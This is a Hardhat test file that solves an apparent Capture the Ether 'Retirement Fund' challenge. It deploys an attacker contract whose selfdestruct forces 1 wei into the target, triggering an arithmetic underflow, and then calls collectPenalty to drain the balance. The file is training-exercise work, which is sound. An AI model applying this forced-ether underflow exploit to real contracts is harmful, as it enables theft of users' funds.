import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
// import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challengeContract: Contract;
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  console.log("eoa : " + await eoa.getAddress());
  const challengeFactory = await ethers.getContractFactory(
    "RetirementFundChallenge"
  );
  challengeContract = challengeFactory.attach(
    `0x29A1BbF637B06Ac304491A0eCc532615739D4fa5`
    );
});

it("solves the challenge", async function () {
  // send 1 wei to the challenge account to trigger overflow
  // need to do this through using selfdestruct which bypasses any checks
  // sending normal tx would fail because there's no receive / fallback function
  const attackerFactory = await ethers.getContractFactory("RetirementFundAttacker");
  attacker = await attackerFactory.deploy(challengeContract.address, {
    value: ethers.utils.parseUnits(`1`, `wei`)
  });

  await eoa.provider!.waitForTransaction(attacker.deployTransaction.hash)

  console.log(`Checking challenge balance ...`);
  expect(await challengeContract.provider.getBalance(challengeContract.address)).to.be.gt(
    ethers.utils.parseEther(`1`),
  );

  // collect penalty
  tx = await challengeContract.collectPenalty();
  await tx.wait();

  const isComplete = await challengeContract.isComplete();
  expect(isComplete).to.be.true;
});
